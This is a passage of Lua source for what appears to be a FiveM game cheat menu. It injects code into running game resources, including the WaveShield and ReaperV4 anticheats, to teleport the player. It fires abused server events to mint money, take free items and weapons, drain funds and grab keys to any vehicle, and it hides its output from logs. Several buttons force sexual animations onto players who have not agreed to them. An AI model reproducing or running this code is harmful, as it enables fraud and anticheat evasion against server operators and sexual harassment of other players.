                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "qd8", "Attempted to twerk on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                        { type = "divider", label = "Vehicle Emotes" },
                        {
                            type = "button",
                            label = "Blow Driver",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player first!", 3000)
                                    return
                                end

                                for _, playerId in ipairs(targetPlayers) do
                                    MachoInjectResourceRaw("any", string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]], playerId, playerId))
                                end

                                self:Notify("success", "qd8", "Attempted BlowDriver on " .. #targetPlayers .. " player(s).", 4000)
                            end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Teleports",
            type = "subMenu",
            categories = {
                {
                    label = "Teleport Menu",
                    tabs = {
                        { type = "button", label = "FIB Building",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'
                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Mission Row PD",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Pillbox Hospital",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]])                             
                        else
                            MachoInjectResourceRaw("any", [[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Grove Street",
                        onSelect = function()
                        local waveShieldStart = GetResourceState("WaveShield") == 'started'
                        local ReaperStart = GetResourceState("ReaperV4") == 'started'

                        if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])
                        elseif
                        ReaperStart then
                        MachoInjectThread(0, "any", "", [[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]])                        
                        else
                            MachoInjectResourceRaw("any", [[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]])                            
                            end
                        end
                        },
                        { type = "button", label = "Legion Square",
                            onSelect = function()
                            local waveShieldStart = GetResourceState("WaveShield") == 'started'
                            local ReaperStart = GetResourceState("ReaperV4") == 'started'

                            if waveShieldStart then
                            MachoInjectResourceRaw("WaveShield", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])
                        elseif
                        ReaperStart then
                            MachoInjectThread(0, "any", "", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                        else
                            MachoInjectResourceRaw("any", [[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]])                            
                            end
                        end
                        },
                    }
                },
            }
        },

        {
            icon = "",
            label = "Settings",
            type = "subMenu",
            categories = {
                {
                    label = "interface",
                    tabs = {
                        { type = "subMenu", label = "Keybinds",
                            subTabs = {
                                { icon = "", type = "button", label = "Menu Key",
                                    onSelect = function()
                                        KeyboardInput("Choose Menu Key", "", function(val)
                                            for vk, name in pairs(MappedKeys) do
                                                if name:lower() == val:lower() then
                                                    MenuKey = name
                                                    Wait(250)
                                                    qd8:ShowUI()
                                                    return
                                                end
                                            end
                                        end, "keybind")
                                    end 
                                },
                            }
                        },
                        { type = "subMenu", label = "Banners",
                            subTabs = {
                                { icon = "", type = "button", label = "Default Banner (Vanta Anime)",
                                    onSelect = function()
                                        qd8:SendMessage({ action = "updateBanner", bannerColor = "152, 45, 234", bannerLink = "https://files.catbox.moe/vgyx34.png" })
                                    end 
                                },

                                { icon = "", type = "button", label = "Red Banner (Redline Banner)",
                                    onSelect = function()
                                        qd8:SendMessage({ action = "updateBanner", bannerColor = "150, 0, 0", bannerLink = "https://cdn.discordapp.com/attachments/1327608230469173318/1443209813013303336/ChatGPT_Image_Nov_26_2025_02_59_14_PM.png?ex=69283d60&is=6926ebe0&hm=ed0711e2768e361f2cbc01f053bcaf5b10b81b7d88d802bf86ea7c90710560e4&" })
                                    end 
                                },

                                { icon = "", type = "button", label = "Blue Banner (Blue)",
                                onSelect = function()
                                    qd8:SendMessage({ action = "updateBanner", bannerColor = "0, 120, 255", bannerLink = "https://cdn.discordapp.com/attachments/1327608230469173318/1443224095113220337/ChatGPT_Image_Nov_26_2025_03_51_42_PM.png?ex=69284aae&is=6926f92e&hm=a230ecfabbb24e5eed15f65cbfca2b1b8c1462a3aed72763e02308e8787ba8be&" })
                                end 
                            },

                                { icon = "", type = "button", label = "Cyber Neon Banner (Purple)",
                                onSelect = function()
                                    qd8:SendMessage({ action = "updateBanner", bannerColor = "152, 45, 234", bannerLink = "https://cdn.discordapp.com/attachments/1327608230469173318/1443163407485370368/ChatGPT_Image_Nov_26_2025_11_55_37_AM.png?ex=6928bae9&is=69276969&hm=25ab15ea0a85e61b37162dc96068081f95f86eb86abecde2887a269233ef0d57&" })
                                end 
                            },

                            }
                        },
                        { type = "button", label = "Move Menu Position", desc = "Press Enter to start, use arrow keys to move, Enter again to save",
                            onSelect = function()
                                qd8:StartManualPositioning()
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Triggers",
            type = "subMenu",
            categories = {
                {
                    label = "CFW",
                    tabs = {
                        { type = "button", label = "Money", desc = "تشغيل جميع ثغرات الأموال",
                            onSelect = function()
                                qd8:Notify("warning", "CFW", "بدء تشغيل جميع ثغرات الأموال...", 3000)
                                
                                MachoLockLogger(MachoInjectResource2(3, "any", [[
                                    local originalPrint = print
                                    print = function() end
                                    
                                    -- RC2 Tow Job V3
                                    TriggerServerEvent('Rc2cityhall:takejob', 'tow')
                                    for i = 1, 198 do
                                        TriggerServerEvent('tow:server:Addpayment')
                                        Wait(0)
                                    end
                                    TriggerServerEvent('tow:server:TakePayment')
                                    
                                    Wait(1000)
                                    
                                    -- QB Tow Job V3
                                    TriggerServerEvent('qb-cityhall:takejob', 'tow')
                                    for i = 1, 198 do
                                        TriggerServerEvent('tow:server:Addpayment')
                                        Wait(0)
                                    end
                                    TriggerServerEvent('tow:server:TakePayment')
                                    
                                    Wait(1000)
                                    
                                    -- RC2 Commission V2
                                    TriggerServerEvent('Rc2-carauction:server:GiveComm', 999999)
                                    
                                    Wait(500)
                                    
                                    -- QB Commission V2
                                    TriggerServerEvent('qb-carauction:server:GiveComm', 999999)
                                    
                                    Wait(500)
                                    
                                    -- L2S Money V1
                                    TriggerServerEvent("l2s-sanitationwork:server:GivebackDeposit", 999999)
                                    
                                    Wait(500)
                                    
                                    -- L2S Money V2
                                    TriggerServerEvent('l2s-tow:server:ApplyJob', {"1"})
                                    TriggerServerEvent("l2s-tow:server:11101110", 999999)
                                    
                                    print = originalPrint
                                ]]))
                                
                                qd8:Notify("success", "CFW", "تم تشغيل جميع ثغرات الأموال!", 3000)
                            end
                        },
                        { type = "button", label = "Free Items", desc = "الحصول على أيتمات مجانية",
                            onSelect = function()
                                KeyboardInput("Item Name", "", function(itemName)
                                    if itemName and itemName ~= "" then
                                        qd8:Notify("warning", "CFW", "بدء الحصول على الأيتم من جميع المتاجر...", 3000)
                                        
                                        MachoLockLogger(MachoInjectResource2(3, "any", [[
                                            local originalPrint = print
                                            print = function() end
                                            
                                            -- V3 Shops
                                            TriggerServerEvent('shops:checkout', 0,
                                                { { Name = "]] .. itemName .. [[", count = 1, itemName = "]] .. itemName .. [[" } }, 
                                                'bank', 'checkout')
                                            
                                            Wait(500)
                                            
                                            -- RC2 Shops
                                            TriggerServerEvent("Rc2-shops:sv:pay", {
                                                cartArr = {
                                                    {
                                                        amount = 50, cid = "undefined", count = 1, id = "0-]] .. itemName .. [[",
                                                        iteminfo = {}, itemname = "]] .. itemName .. [[", pos = 0, price = 0, type = "item"
                                                    }
                                                },
                                                payType = 'bank', price = 0, shopname = "liquor Supermarket"
                                            })
                                            
                                            Wait(500)
                                            
                                            -- QB Shops
                                            TriggerServerEvent("qb-shops:sv:pay", {
                                                cartArr = {
                                                    {
                                                        amount = 50, cid = "undefined", count = 1, id = "0-]] .. itemName .. [[",
                                                        iteminfo = {}, itemname = "]] .. itemName .. [[", pos = 0, price = 0, type = "item"
                                                    }
                                                },
                                                payType = 'bank', price = 0, shopname = "liquor Supermarket"
                                            })
                                            
                                            Wait(500)
                                            
                                            -- L2S Shops
                                            local payload = {
                                                ["]] .. itemName .. [["] = {
                                                    image = 'nui://l2s-inventory/images/]] .. itemName .. [[.webp',
                                                    item = "]] .. itemName .. [[",
                                                    itemamount = 1,
                                                    iteminfo = {},
                                                    itemlabel = "]] .. itemName .. [[",
                                                    itemprice = 0
                                                }
                                            }
                                            TriggerServerEvent("l2s-shops:server:BuyItems", 'bank', payload, false, 0)
                                            
                                            print = originalPrint
                                        ]]))
                                        
                                        qd8:Notify("success", "CFW", "تم الحصول على: " .. itemName .. " من جميع المتاجر!", 3000)
                                    else
                                        qd8:Notify("error", "CFW", "يرجى إدخال اسم الأيتم", 2000)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Remove Money", desc = "سحب أموال من جميع اللاعبين",
                            onSelect = function()
                                KeyboardInput("Amount", "", function(amount)
                                    if amount and amount ~= "" and tonumber(amount) then
                                        qd8:Notify("warning", "CFW", "بدء سحب الأموال من جميع المتاجر...", 3000)
                                        
                                        MachoLockLogger(MachoInjectResource2(3, "any", [[
                                            local originalPrint = print
                                            print = function() end
                                            
                                            -- V3 Shops
                                            TriggerServerEvent('shops:checkout', ]] .. tonumber(amount) .. [[,
                                                { { Name = "Sandwich", count = 1, itemName = "lockpick" } },
                                                'bank', 'checkout')
                                            
                                            Wait(500)
                                            
                                            -- RC2 Shops
                                            TriggerServerEvent("Rc2-shops:sv:pay", {
                                                cartArr = {
                                                    {
                                                        amount = 50, cid = "undefined", count = 1, id = "0-twerks_candy",
                                                        iteminfo = {}, itemname = "lockpick", pos = 0, price = ]] .. tonumber(amount) .. [[, type = "item"
                                                    }
                                                },
                                                payType = 'bank', price = ]] .. tonumber(amount) .. [[, shopname = "liquor Supermarket"
                                            })
                                            
                                            Wait(500)
                                            
                                            -- QB Shops
                                            TriggerServerEvent("qb-shops:sv:pay", {
                                                cartArr = {
                                                    {
                                                        amount = 50, cid = "undefined", count = 1, id = "0-twerks_candy",
                                                        iteminfo = {}, itemname = "lockpick", pos = 0, price = ]] .. tonumber(amount) .. [[, type = "item"
                                                    }
                                                },
                                                payType = 'bank', price = ]] .. tonumber(amount) .. [[, shopname = "liquor Supermarket"
                                            })
                                            
                                            Wait(500)
                                            
                                            -- L2S Shops
                                            local payload = {
                                                ["water_bottle"] = {
                                                    image = 'nui://l2s-inventory/images/water_bottle.webp',
                                                    item = "lockpick",
                                                    itemamount = 1,
                                                    iteminfo = {fooding = 11},
                                                    itemlabel = "Bottle of Water",
                                                    itemprice = ]] .. tonumber(amount) .. [[,
                                                }
                                            }
                                            TriggerServerEvent("l2s-shops:server:BuyItems", 'bank', payload, false, ]] .. tonumber(amount) .. [[)
                                            
                                            print = originalPrint
                                        ]]))
                                        
                                        qd8:Notify("success", "CFW", "تم سحب المال: " .. amount .. " من جميع المتاجر!", 3000)
                                    else
                                        qd8:Notify("error", "CFW", "يرجى إدخال مبلغ صحيح", 2000)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Open Any Vehicle", desc = "فتح أي مركبة بالضغط على G",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    Citizen.CreateThread(function()
                                        while true do
                                            Citizen.Wait(0)
                                            if IsControlJustPressed(0, 47) then
                                                local player = PlayerPedId()
                                                local vehicle = GetVehiclePedIsIn(player, false)
                                    
                                                if vehicle == 0 then
                                                    local pos = GetEntityCoords(player)
                                                    local radius = 5.0
                                                    local closestVehicle = GetClosestVehicle(pos.x, pos.y, pos.z, radius, 0, 71)
                                                    vehicle = closestVehicle
                                                end
                                    
                                                if vehicle and vehicle ~= 0 then
                                                    local plate = GetVehicleNumberPlateText(vehicle)
                                                    TriggerServerEvent('Rc2-vehiclekeys:server:AcquireVehicleKeys', plate)
                                                    TriggerServerEvent('qb-vehiclekeys:server:AcquireVehicleKeys', plate)
                                                    TriggerServerEvent('nf-vehiclekeys:server:AcquireVehicleKeys', plate)
                                                    TriggerServerEvent('vehiclekeys:server:AcquireVehicleKeys', plate)
                                                    ShowCustomNotification("🔑 تم إرسال طلب فتح السيارة.")
                                                else
                                                    ShowCustomNotification("🚫 لا توجد سيارة قريبة.")
                                                end
                                            end
                                        end
                                    end)
                                    
                                    function ShowCustomNotification(msg)
                                        SetNotificationTextEntry("STRING")
                                        AddTextComponentString(msg)
                                        DrawNotification(false, false)
                                    end
                                ]])
                                qd8:Notify("success", "CFW", "تم تفعيل فتح المركبات بالضغط على G", 3000)
                            end
                        },
                        { type = "button", label = "Open Shop qd8", desc = "فتح متجر qd8 مع جميع الأيتمات مجاناً",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    TriggerServerEvent('inventory:server:OpenInventory', 'shop', 'qd8', {
                                        items = {
                                            -- الأسلحة
                                            {amount = 1, info = {}, name = "weapon_heavypistol", price = 0, slot = 1, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_pistol_mk2", price = 0, slot = 2, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_pistol50", price = 0, slot = 3, type = "item"},
                                            {amount = 6, info = {}, name = "laserdrill", price = 0, slot = 4, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_snspistol", price = 0, slot = 5, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_flashlight", price = 0, slot = 6, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_carbinerifle", price = 0, slot = 7, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_assaultrifle", price = 0, slot = 8, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_smg", price = 0, slot = 9, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_microsmg", price = 0, slot = 10, type = "item"},
                                            {amount = 10000, info = {}, name = "pistol_ammo", price = 0, slot = 11, type = "item"},
                                            {amount = 10000, info = {}, name = "rifle_ammo", price = 0, slot = 12, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_carbinerifle_mk2", price = 0, slot = 13, type = "item"},
                                            {amount = 1000, info = {}, name = "goldcoins", price = 0, slot = 14, type = "item"},
                                            {amount = 10000, info = {}, name = "smg_ammo", price = 0, slot = 15, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_crowbar", price = 0, slot = 16, type = "item"},
                                            
                                            -- أسلحة إضافية
                                            {amount = 1, info = {}, name = "weapon_knife", price = 0, slot = 70, type = "item"},
                                            {amount = 1, info = {}, name = "huntingknife", price = 0, slot = 71, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_nightstick", price = 0, slot = 72, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_hammer", price = 0, slot = 73, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_bat", price = 0, slot = 74, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_golfclub", price = 0, slot = 75, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_combatpistol", price = 0, slot = 76, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_appistol", price = 0, slot = 77, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_assaultsmg", price = 0, slot = 78, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_advancedrifle", price = 0, slot = 79, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_mg", price = 0, slot = 80, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_combatmg", price = 0, slot = 81, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_pumpshotgun", price = 0, slot = 82, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_sawnoffshotgun", price = 0, slot = 83, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_assaultshotgun", price = 0, slot = 84, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_bullpupshotgun", price = 0, slot = 85, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_stungun", price = 0, slot = 86, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_sniperrifle", price = 0, slot = 87, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_heavysniper", price = 0, slot = 88, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_remotesniper", price = 0, slot = 89, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_grenadelauncher", price = 0, slot = 90, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_grenadelauncher_smoke", price = 0, slot = 91, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_rpg", price = 0, slot = 92, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_minigun", price = 0, slot = 93, type = "item"},
